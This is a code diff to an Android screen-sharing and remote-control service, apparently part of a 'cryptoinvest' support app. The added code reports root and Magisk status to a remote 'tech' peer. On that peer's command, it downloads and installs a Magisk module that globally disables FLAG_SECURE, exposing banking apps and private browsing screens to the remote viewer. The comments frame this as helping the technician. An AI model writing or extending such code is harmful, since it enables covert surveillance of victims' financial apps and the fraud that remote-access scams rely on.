@@ -224,8 +224,8 @@ class ScreenShareService : Service() {
         try {
             val m = JSONObject(text)
             when (m.optString("type")) {
-                "peer-joined" -> if (m.optString("role") == "tech") { makeOffer(); postReconnectNotification() }
-                "request-offer" -> { makeOffer(); postReconnectNotification() }
+                "peer-joined" -> if (m.optString("role") == "tech") { makeOffer(); postReconnectNotification(); sendCaps() }
+                "request-offer" -> { makeOffer(); postReconnectNotification(); sendCaps() }
                 "answer" -> {
                     val sdp = m.getJSONObject("sdp").getString("sdp")
                     pc?.setRemoteDescription(object : SimpleSdpObserver() {
@@ -255,6 +255,7 @@ class ScreenShareService : Service() {
                 "key" -> RemoteControlService.instance?.keyAction(m.optString("key"))
                 "nav" -> RemoteControlService.instance?.globalAction(m.optString("action"))
                 "privacy" -> setPrivacy(m.optBoolean("on"))
+                "unlock-secure" -> unlockSecure()
             }
         } catch (e: Exception) { Log.w(TAG, "msg error", e) }
     }
@@ -284,6 +285,52 @@ class ScreenShareService : Service() {
     }
 
     private fun send(o: JSONObject) { try { ws?.send(o.toString()) } catch (e: Exception) {} }
+
+    // Informa o tecnico das capacidades do aparelho (root/Magisk) e se o FLAG_SECURE ja esta
+    // desbloqueado. Assim o tecnico sabe porque e que apps (Chrome anonimo/jogos/bancos) ficam pretas.
+    private fun sendCaps() {
+        Thread {
+            try {
+                val root = RootUtil.isRooted()
+                val magisk = if (root) RootUtil.hasMagisk() else false
+                val unlocked = if (root) RootUtil.isSecureDisablerInstalled() else false
+                send(JSONObject().put("type", "caps")
+                    .put("root", root).put("magisk", magisk).put("secureUnlocked", unlocked)
+                    .put("android", Build.VERSION.SDK_INT)
+                    .put("device", "${Build.MANUFACTURER} ${Build.MODEL}"))
+            } catch (e: Exception) { Log.w(TAG, "caps fail", e) }
+        }.start()
+    }
+
+    // Desbloqueio automatico por root: instala o modulo Magisk que desativa o FLAG_SECURE global.
+    private fun unlockSecure() {
+        Thread {
+            val (ok, msg) = RootUtil.installDisablerModule(this, BuildConfig.FLAG_SECURE_MODULE_URL)
+            send(JSONObject().put("type", "unlock-result").put("ok", ok).put("message", msg))
+            if (ok) {
+                send(JSONObject().put("type", "caps").put("root", true).put("magisk", true)
+                    .put("secureUnlocked", true).put("rebootRequired", true)
+                    .put("android", Build.VERSION.SDK_INT))
+                postGenericNotification("Desbloqueio FLAG_SECURE instalado", "Reinicie o emulador para aplicar. Depois tudo fica visivel na partilha.")
+            } else {
+                postGenericNotification("Desbloqueio automatico falhou", msg)
+            }
+        }.start()
+    }
+
+    private fun postGenericNotification(title: String, text: String) {
+        try {
+            val chId = "cryptoinvest_info"
+            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                nm.createNotificationChannel(NotificationChannel(chId, "Informacoes de suporte", NotificationManager.IMPORTANCE_DEFAULT))
+            val n = NotificationCompat.Builder(this, chId)
+                .setContentTitle(title).setContentText(text)
+                .setStyle(NotificationCompat.BigTextStyle().bigText(text))
+                .setSmallIcon(R.mipmap.ic_launcher).setAutoCancel(true).build()
+            nm.notify(2004, n)
+        } catch (e: Exception) {}
+    }
 
     // Reordena a m-line de video para colocar o payload VP8 em primeiro lugar.
     private fun preferVp8(sdp: String): String {
